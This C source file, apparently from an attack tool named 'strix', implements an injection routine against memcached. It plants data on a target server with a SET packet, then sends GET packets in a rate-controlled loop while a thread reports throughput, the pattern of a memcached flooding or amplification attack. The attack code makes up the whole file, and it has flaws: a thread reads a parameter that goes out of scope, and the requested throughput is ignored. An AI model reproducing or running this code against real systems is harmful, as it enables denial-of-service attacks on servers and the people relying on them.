#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include "strix.h"
#include "error.h"
#include "netbasic.c"

#define MEGABYTE 1000000
#define DEFAULT_INTERVAL 32400 //Valor encontrado de microsegundos para conseguimos um Throughput aproximado de 1Mb/s máquina Spitfire

static int thp_counter = 0;
static float throughput = 0;

volatile sig_atomic_t control = true;
unsigned long interval = 0; // useconds_t

static void sigint_handler( int signum )
{
  control = false;
  fprintf(stdout, "\nShutdown signal received\n");
}

static void *ThroughputHandler( void *arg )
{
  assert( NULL != arg );

  int *pktSize = (int *) arg;
  
  do{
    sleep(1);
    throughput = (*pktSize) * thp_counter;
    thp_counter = 0;
    printf("%f Mb/s\n", throughput / MEGABYTE);
  }while( likely(control) );

  return NULL; //Keep compiler quiet
}

static void ThroughputController( int pktSize, float thp )
{
  pthread_t thread_id;
  interval =  DEFAULT_INTERVAL; 
  if( 0 != pthread_create(&thread_id, NULL, ThroughputHandler, &pktSize) ){
    char buffer[50];
    sprintf (buffer, "Cannot create thread: ERROR %d\n", errno);
    handle_fatal(buffer);
  }

}

void inject(AttackData * atkData)
{
  int socket = -1;
  struct sockaddr_in saddr =
  {
    .sin_family = AF_INET,
    .sin_port = htons(atkData->atkPlan->target_port),
    .sin_addr.s_addr = inet_addr(atkData->atkPlan->target_ip)
  };

  signal(SIGINT, sigint_handler);
  socket = create_socket();
  //Precisamos inserir os dados no memcached antes de iniciar o ataque
  if( unlikely( !send_packet(socket, atkData->setPacket->packet_ptr, atkData->setPacket->size, (struct sockaddr *)&saddr) ) ){
    handle_fatal("Socket Error\n");
    goto inject_exit;
  }

  ThroughputController( atkData->getPacket->size, atkData->atkPlan->throughput); 
  do{
    if( unlikely( !send_packet(socket, atkData->getPacket->packet_ptr, atkData->getPacket->size, (struct sockaddr *)&saddr) ) ){
      handle_fatal("Scoket error\n");
      goto inject_exit;
    }
    thp_counter++;
    usleep(interval);
  }while( likely(control) );

inject_exit:
  close_socket( socket );
}


